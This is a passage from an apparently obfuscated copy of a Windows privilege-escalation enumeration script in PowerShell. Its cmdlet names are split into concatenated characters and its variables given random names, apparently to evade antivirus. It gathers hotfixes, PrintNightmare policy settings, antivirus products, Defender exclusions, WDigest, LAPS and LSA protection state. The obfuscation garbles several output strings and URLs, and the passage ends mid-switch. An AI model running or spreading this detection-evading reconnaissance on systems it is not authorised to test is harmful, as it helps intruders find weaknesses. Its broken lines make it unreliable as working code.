&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -BackgroundColor Red -ForegroundColor White "Any misuse of this software will not be the responsibility of the author or of any other collaborator"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -BackgroundColor Red -ForegroundColor White "Use it at your own networks and/or with the network owner's explicit permission"


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor red    "Indicates special privilege over an object or misconfiguration"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor green  "Indicates protection is enabled or something is well configured"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor cyan   "Indicates active users"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Gray   "Indicates disabled users"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor yellow "Indicates links"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue   "Indicates title"


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('c' + 'h' + 'e' + 'c' + 'k' + 'l' + 'i' + 's' + 't' + '-' + 'w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n').html" -ForegroundColor Yellow
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Best Linux PE & Hardening course: https://&('h' + 'a' + 'c' + 'k' + 't' + 'r' + 'i' + 'c' + 'k' + 's' + '-' + 't' + 'r' + 'a' + 'i' + 'n' + 'i' + 'n' + 'g').com/courses/lhe/" -ForegroundColor Yellow



&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "====================================||SYSTEM INFORMATION ||===================================="
"The following information is curated. To get a full list of system information, run the cmdlet &('g' + 'e' + 't' + '-' + 'c' + 'o' + 'm' + 'p' + 'u' + 't' + 'e' + 'r' + 'i' + 'n' + 'f' + 'o')"

systeminfo.exe


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| WINDOWS HOTFIXES"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "=| Check missing patches with the embedded windows vulnerability definitions" -ForegroundColor Yellow
$auiOgRIXdCBqTGjEJrQunRBSLrVgDHzPPhZcZoXhBdxwfnTKkvoXVyDrBiJVnNGGGSQGexthKuicSaDLWevhdIZkRMbZRiYxRbGG = &('G' + 'e' + 't' + '-' + 'H' + 'o' + 't' + 'F' + 'i' + 'x') | &('S' + 'o' + 'r' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -Descending -Property InstalledOn -ErrorAction SilentlyContinue | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') HotfixID, Description, InstalledBy, InstalledOn
$auiOgRIXdCBqTGjEJrQunRBSLrVgDHzPPhZcZoXhBdxwfnTKkvoXVyDrBiJVnNGGGSQGexthKuicSaDLWevhdIZkRMbZRiYxRbGG | &('F' + 'o' + 'r' + 'm' + 'a' + 't' + '-' + 'T' + 'a' + 'b' + 'l' + 'e') -AutoSize


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| PRINTNIGHTMARE POINTANDPRINT POLICY"
$hBsXEYhgwtPMRLAXTZabcAwgUSlTkHnJwsCjuReIPmiXJjHqWIQwTTQpvFLCztaVycxJMrPYPnyKtHsXRaMVYpAXSondWtLtQLTa = "HKLM:\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') $hBsXEYhgwtPMRLAXTZabcAwgUSlTkHnJwsCjuReIPmiXJjHqWIQwTTQpvFLCztaVycxJMrPYPnyKtHsXRaMVYpAXSondWtLtQLTa) {
  $VdkGeIfRKFDpltquItMfipQPebrRFyeJYeAwsDIKgzHPVebMostJkbLrDRUQgJRHmBCkZwXqwUUdnqNrusmkzbbVElCxsiPeSFbC = &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') -Path $hBsXEYhgwtPMRLAXTZabcAwgUSlTkHnJwsCjuReIPmiXJjHqWIQwTTQpvFLCztaVycxJMrPYPnyKtHsXRaMVYpAXSondWtLtQLTa -ErrorAction SilentlyContinue
  $toevgtOCqzQhHNlSyVBrTXerzskFAvLjNPwYjYwhDHDrCdfeMevSAWCkxDWdpBsbgoCVSGVAYiZPqiwaVwYjQKApHgQMONkHIgTu = $VdkGeIfRKFDpltquItMfipQPebrRFyeJYeAwsDIKgzHPVebMostJkbLrDRUQgJRHmBCkZwXqwUUdnqNrusmkzbbVElCxsiPeSFbC.RestrictDriverInstallationToAdministrators
  $YnWdGPgRjmOjlWHifFlJQWueiALQGfpTBrZdNQOdbovZLZONUhdMMWCaZuaBsFWCAOCAHEUoKBzuAjbkYGhcbXIUuZygbhPPZZBM = $VdkGeIfRKFDpltquItMfipQPebrRFyeJYeAwsDIKgzHPVebMostJkbLrDRUQgJRHmBCkZwXqwUUdnqNrusmkzbbVElCxsiPeSFbC.NoWarningNoElevationOnInstall
  $naDgasmsIwVhWDKUeaUYKMCzjAiVMvmjtsaslyAGaCHDuIaNBxvZpIXvsuMlWRFNsvUUSnagAySLOGucPJadGovfHHTBStNgZZQL = $VdkGeIfRKFDpltquItMfipQPebrRFyeJYeAwsDIKgzHPVebMostJkbLrDRUQgJRHmBCkZwXqwUUdnqNrusmkzbbVElCxsiPeSFbC.UpdatePromptSettings

  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "RestrictDriverInstallationToAdministrators: $toevgtOCqzQhHNlSyVBrTXerzskFAvLjNPwYjYwhDHDrCdfeMevSAWCkxDWdpBsbgoCVSGVAYiZPqiwaVwYjQKApHgQMONkHIgTu"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "NoWarningNoElevationOnInstall: $YnWdGPgRjmOjlWHifFlJQWueiALQGfpTBrZdNQOdbovZLZONUhdMMWCaZuaBsFWCAOCAHEUoKBzuAjbkYGhcbXIUuZygbhPPZZBM"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "UpdatePromptSettings: $naDgasmsIwVhWDKUeaUYKMCzjAiVMvmjtsaslyAGaCHDuIaNBxvZpIXvsuMlWRFNsvUUSnagAySLOGucPJadGovfHHTBStNgZZQL"

  $eAUMUHTLbqYsOlRrqJjemrckyWFFaIpfuWtIfuEwAXBeRhncHGKsRyyjlYMNAtqzgRxEHJXRKydnaqIakIYFXQzHLBBKZYeMRDrI = ($null -ne $toevgtOCqzQhHNlSyVBrTXerzskFAvLjNPwYjYwhDHDrCdfeMevSAWCkxDWdpBsbgoCVSGVAYiZPqiwaVwYjQKApHgQMONkHIgTu) -and ($null -ne $YnWdGPgRjmOjlWHifFlJQWueiALQGfpTBrZdNQOdbovZLZONUhdMMWCaZuaBsFWCAOCAHEUoKBzuAjbkYGhcbXIUuZygbhPPZZBM) -and ($null -ne $naDgasmsIwVhWDKUeaUYKMCzjAiVMvmjtsaslyAGaCHDuIaNBxvZpIXvsuMlWRFNsvUUSnagAySLOGucPJadGovfHHTBStNgZZQL)
  if (-not $eAUMUHTLbqYsOlRrqJjemrckyWFFaIpfuWtIfuEwAXBeRhncHGKsRyyjlYMNAtqzgRxEHJXRKydnaqIakIYFXQzHLBBKZYeMRDrI) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "PointAndPrint policy values are missing or not configured" -ForegroundColor Gray
  } elseif (($toevgtOCqzQhHNlSyVBrTXerzskFAvLjNPwYjYwhDHDrCdfeMevSAWCkxDWdpBsbgoCVSGVAYiZPqiwaVwYjQKApHgQMONkHIgTu -eq 0) -and ($YnWdGPgRjmOjlWHifFlJQWueiALQGfpTBrZdNQOdbovZLZONUhdMMWCaZuaBsFWCAOCAHEUoKBzuAjbkYGhcbXIUuZygbhPPZZBM -eq 1) -and ($naDgasmsIwVhWDKUeaUYKMCzjAiVMvmjtsaslyAGaCHDuIaNBxvZpIXvsuMlWRFNsvUUSnagAySLOGucPJadGovfHHTBStNgZZQL -eq 2)) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Potentially vulnerable to PrintNightmare misconfiguration" -ForegroundColor Red
  } else {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "PointAndPrint policy is not in the known risky configuration" -ForegroundColor Green
  }
} else {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "PointAndPrint policy key not found" -ForegroundColor Gray
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| ALL UPDATES INSTALLED"



$PmyojDQzbMwnnenwMfvyMWsJoCEMfWYQDsdQINAdTGJvdAreoKqkqgFKfvvzLQVXMqtoqUmmNFkNJINkmrqAuXHPPvTdmkFADCxR = (&('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -ComObject 'Microsoft.Update.Session')
$MSBZeOzCEYOqGHNpCxmQhgDKkIVMrRAMZlJAElKOERHiRTUnktDcHRfgEHrvAvaxwnrDuYxZWDHSUEAFPlFqfswuQbNddOAlTuIt = $PmyojDQzbMwnnenwMfvyMWsJoCEMfWYQDsdQINAdTGJvdAreoKqkqgFKfvvzLQVXMqtoqUmmNFkNJINkmrqAuXHPPvTdmkFADCxR.QueryHistory("", 0, 1000) | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') ResultCode, Date, Title

$GlhAFXfkeNTclRYhRSFTjdjRVlzKeXXuazFMOjjyFXTJAKacDliECdCTJoFwNkYeGtMxOopUrHWnZTiTzGSaDccVyeBHYJaPpkeE = @()

$IOpBMWwXxlQsMyzQhYZuFjBpYvnOjncWROHpovakCanyGKLIPjhJewvKnXMaoCCWWDgUvVoKSjjkNzxanfXFrjgsiryIrlhzaJEX = @()

for ($UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK = 0; $UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK -lt $MSBZeOzCEYOqGHNpCxmQhgDKkIVMrRAMZlJAElKOERHiRTUnktDcHRfgEHrvAvaxwnrDuYxZWDHSUEAFPlFqfswuQbNddOAlTuIt.Count; $UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK++) {
  $agVzeMKOJnTfruOVKrRyttqAVlChgYaONzMZPFVHTxwfEhShBbrMMqLxAOPUiccWjtaGJdyTFjwMDliroXFKbVSGykbiXaTZprby = returnHotFixID -title $MSBZeOzCEYOqGHNpCxmQhgDKkIVMrRAMZlJAElKOERHiRTUnktDcHRfgEHrvAvaxwnrDuYxZWDHSUEAFPlFqfswuQbNddOAlTuIt[$UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK].Title
  if ($GlhAFXfkeNTclRYhRSFTjdjRVlzKeXXuazFMOjjyFXTJAKacDliECdCTJoFwNkYeGtMxOopUrHWnZTiTzGSaDccVyeBHYJaPpkeE -like $agVzeMKOJnTfruOVKrRyttqAVlChgYaONzMZPFVHTxwfEhShBbrMMqLxAOPUiccWjtaGJdyTFjwMDliroXFKbVSGykbiXaTZprby) {
  }
  else {
    $GlhAFXfkeNTclRYhRSFTjdjRVlzKeXXuazFMOjjyFXTJAKacDliECdCTJoFwNkYeGtMxOopUrHWnZTiTzGSaDccVyeBHYJaPpkeE += $agVzeMKOJnTfruOVKrRyttqAVlChgYaONzMZPFVHTxwfEhShBbrMMqLxAOPUiccWjtaGJdyTFjwMDliroXFKbVSGykbiXaTZprby
    $IOpBMWwXxlQsMyzQhYZuFjBpYvnOjncWROHpovakCanyGKLIPjhJewvKnXMaoCCWWDgUvVoKSjjkNzxanfXFrjgsiryIrlhzaJEX += $UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK
  }
}
$VlbqnubpUzkjxEKRRkmCdsytpnTXvYeTvEheFvpePVmkRivPafFDeFfQNPlQyUtiMBzEWhRAURqFgxAvqYKxyHSSsgeCcSMnGeVZ = @()

$IOpBMWwXxlQsMyzQhYZuFjBpYvnOjncWROHpovakCanyGKLIPjhJewvKnXMaoCCWWDgUvVoKSjjkNzxanfXFrjgsiryIrlhzaJEX | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $fFMjadoomwbpoSlHVGJUHmktFtsEzULwZBBSSztFjOZqAtnBiNLTEJBrAXTYhVdoRKWsCJVYbhTjztVOZrGbwDuUwyRCmYNDsRYN = $MSBZeOzCEYOqGHNpCxmQhgDKkIVMrRAMZlJAElKOERHiRTUnktDcHRfgEHrvAvaxwnrDuYxZWDHSUEAFPlFqfswuQbNddOAlTuIt[$_]
  $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk = $fFMjadoomwbpoSlHVGJUHmktFtsEzULwZBBSSztFjOZqAtnBiNLTEJBrAXTYhVdoRKWsCJVYbhTjztVOZrGbwDuUwyRCmYNDsRYN.ResultCode
  switch ($KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk) {
    1 {
      $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk = "Missing/Superseded"
    }
    2 {
      $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk = "Succeeded"
    }
    3 {
      $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk = "Succeeded With Errors"
    }
    4 {
      $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk = "Failed"
    }
    5 {
      $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk = "Canceled"
    }
  }
  $VlbqnubpUzkjxEKRRkmCdsytpnTXvYeTvEheFvpePVmkRivPafFDeFfQNPlQyUtiMBzEWhRAURqFgxAvqYKxyHSSsgeCcSMnGeVZ += &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -TypeName PSObject -Property ([Ordered]@{ 
    Result = $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk
    Date   = $fFMjadoomwbpoSlHVGJUHmktFtsEzULwZBBSSztFjOZqAtnBiNLTEJBrAXTYhVdoRKWsCJVYbhTjztVOZrGbwDuUwyRCmYNDsRYN.Date
    Title  = $fFMjadoomwbpoSlHVGJUHmktFtsEzULwZBBSSztFjOZqAtnBiNLTEJBrAXTYhVdoRKWsCJVYbhTjztVOZrGbwDuUwyRCmYNDsRYN.Title
  })
}
$VlbqnubpUzkjxEKRRkmCdsytpnTXvYeTvEheFvpePVmkRivPafFDeFfQNPlQyUtiMBzEWhRAURqFgxAvqYKxyHSSsgeCcSMnGeVZ | &('F' + 'o' + 'r' + 'm' + 'a' + 't' + '-' + 'T' + 'a' + 'b' + 'l' + 'e') -AutoSize


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Drive Info"
&('A' + 'd' + 'd' + '-' + 'T' + 'y' + 'p' + 'e') -AssemblyName System.Management

$QxgGDZzepRQtqKvxHCqeMmeeWdmgSJmcBiUomOXncRsPqofrckRWREclINbFhaDSsbgJcYafMuxouoJECahFbfvmcRcZtrhAzcrC = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.Management.ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3")

$nckDzBeXMBkDDXcojeMxTWmljcifReVQSRHRpZHrIXEZwFibMlQIVuyJocQHUPPZZKWlqgpwtAvdtONqrFvEIkBUooBzIFTQsArT = $QxgGDZzepRQtqKvxHCqeMmeeWdmgSJmcBiUomOXncRsPqofrckRWREclINbFhaDSsbgJcYafMuxouoJECahFbfvmcRcZtrhAzcrC.Get()

foreach ($eFukGwjvejxWSJfHodUuEJMZcIwDAYZkUSrskPeBVYwsabXFeXkcmUYMmupXUHQHdizvtwajcXotTvMDENHHQEykGeVIkfsxwaNy in $nckDzBeXMBkDDXcojeMxTWmljcifReVQSRHRpZHrIXEZwFibMlQIVuyJocQHUPPZZKWlqgpwtAvdtONqrFvEIkBUooBzIFTQsArT) {
  $VuLiHnDnSdzSREyQdhmQdLAEiyveeQKpgeWDivZBpbnipnSHyarVeCEnkkiAPHACeiEITvuedKNlhNwjneNEMWVQQvQoSywJPMRf = $eFukGwjvejxWSJfHodUuEJMZcIwDAYZkUSrskPeBVYwsabXFeXkcmUYMmupXUHQHdizvtwajcXotTvMDENHHQEykGeVIkfsxwaNy.DeviceID
  $sHQeGjZoTsBPdKnvMXThNjylRngyChOyuSnAynPQaqLGDtcEMyxtYaMqLdIUfdAmsUUtjcWAjELYDVVkHHQJsHvbVUyYwMSxyILZ = $eFukGwjvejxWSJfHodUuEJMZcIwDAYZkUSrskPeBVYwsabXFeXkcmUYMmupXUHQHdizvtwajcXotTvMDENHHQEykGeVIkfsxwaNy.VolumeName
  $KXTfXpcMCeMrXoeqbIcoSjFzmtlHFnYfzIVcakJftDnltGKnVdtZnsoPZvGaWJwPYvygHFgLLPnFqCxaVusZBKaVGbTRIuPwMpLY = [math]::Round($eFukGwjvejxWSJfHodUuEJMZcIwDAYZkUSrskPeBVYwsabXFeXkcmUYMmupXUHQHdizvtwajcXotTvMDENHHQEykGeVIkfsxwaNy.Size / 1GB, 2)
  $VHarKqLRaDXxmCPjXCcdrLTEcOHfyXuEjNHHwqAETIAmVyoWCfGyhXYAvvQQrpnpayEGbxRoHbmQkQjkCcPwiNUzpcfZgKiJnZHM = [math]::Round($eFukGwjvejxWSJfHodUuEJMZcIwDAYZkUSrskPeBVYwsabXFeXkcmUYMmupXUHQHdizvtwajcXotTvMDENHHQEykGeVIkfsxwaNy.FreeSpace / 1GB, 2)

  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'O' + 'u' + 't' + 'p' + 'u' + 't') "Drive: $VuLiHnDnSdzSREyQdhmQdLAEiyveeQKpgeWDivZBpbnipnSHyarVeCEnkkiAPHACeiEITvuedKNlhNwjneNEMWVQQvQoSywJPMRf"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'O' + 'u' + 't' + 'p' + 'u' + 't') "Label: $sHQeGjZoTsBPdKnvMXThNjylRngyChOyuSnAynPQaqLGDtcEMyxtYaMqLdIUfdAmsUUtjcWAjELYDVVkHHQJsHvbVUyYwMSxyILZ"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'O' + 'u' + 't' + 'p' + 'u' + 't') "Size: $KXTfXpcMCeMrXoeqbIcoSjFzmtlHFnYfzIVcakJftDnltGKnVdtZnsoPZvGaWJwPYvygHFgLLPnFqCxaVusZBKaVGbTRIuPwMpLY GB"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'O' + 'u' + 't' + 'p' + 'u' + 't') "Free Space: $VHarKqLRaDXxmCPjXCcdrLTEcOHfyXuEjNHHwqAETIAmVyoWCfGyhXYAvvQQrpnpayEGbxRoHbmQkQjkCcPwiNUzpcfZgKiJnZHM GB"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'O' + 'u' + 't' + 'p' + 'u' + 't') ""
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Antivirus Detection (attemping to read exclusions as well)"
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName
&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') 'registry::HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions' -ErrorAction SilentlyContinue


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| NET ACCOUNTS Info"
net accounts

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| REGISTRY SETTINGS CHECK"

 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Audit Log Settings"
if ((&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\).Property) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\
}
else {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No Audit Log settings, no registry entry found."
}

 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Windows Event Forward (WEF) registry"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
}
else {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Logs are not being fowarded, no registry entry found."
}

 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| LAPS Check"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') 'C:\Program Files\LAPS\CSE\Admpwd.dll') { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "LAPS dll found on this machine at C:\Program Files\LAPS\CSE\" -ForegroundColor Green }
elseif (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll' ) { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "LAPS dll found on this machine at C:\Program Files (x86)\LAPS\CSE\" -ForegroundColor Green }
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "LAPS dlls not found on this machine" }
if ((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\Software\Policies\Microsoft Services\AdmPwd -ErrorAction SilentlyContinue).AdmPwdEnabled -eq 1) { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "LAPS registry key found on this machine" -ForegroundColor Green }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| WDigest Check"
$ZztpJCgUIngwzPbRirryHHmUzJNEktNJZrwYbzueIiKzNdhWxKhAkNEQhryavEXBPhVrDdLViDSGDasCMEbbWvVDlSxTQcgcGTHb = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest).UseLogonCredential
switch ($ZztpJCgUIngwzPbRirryHHmUzJNEktNJZrwYbzueIiKzNdhWxKhAkNEQhryavEXBPhVrDdLViDSGDasCMEbbWvVDlSxTQcgcGTHb) {
  0 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Value 0 found. &('P' + 'l' + 'a' + 'i' + 'n' + '-' + 't' + 'e' + 'x' + 't') Passwords are not stored in LSASS" }
  1 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Value 1 found. &('P' + 'l' + 'a' + 'i' + 'n' + '-' + 't' + 'e' + 'x' + 't') Passwords may be stored in LSASS" -ForegroundColor red }
  Default { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "The system was unable to find the specified registry value: UseLogonCredential" }
}

 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| LSA Protection Check"
$dXhMmmXELoSvpgXdEKOOTECKiwiaNvrENtCkqKZQszMNdvxZYYjkzqVNRYXApiRNuwFKjyLSbYtgVKfsqnkVkpKKmifwelrxNvTp = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SYSTEM\CurrentControlSet\Control\LSA).RunAsPPL
$FcxXHaYVstkujkEdVZKuaIyRtkLgvCFnKrkAuBwSJyZToGUyAmOKetWkIKtVignYveDFUfMRUIcoGzFWAtdYnnmganLaWrpNKUNH = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SYSTEM\CurrentControlSet\Control\LSA).RunAsPPLBoot
switch ($dXhMmmXELoSvpgXdEKOOTECKiwiaNvrENtCkqKZQszMNdvxZYYjkzqVNRYXApiRNuwFKjyLSbYtgVKfsqnkVkpKKmifwelrxNvTp) {
  2 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "RunAsPPL: 2. Enabled without UEFI Lock" }
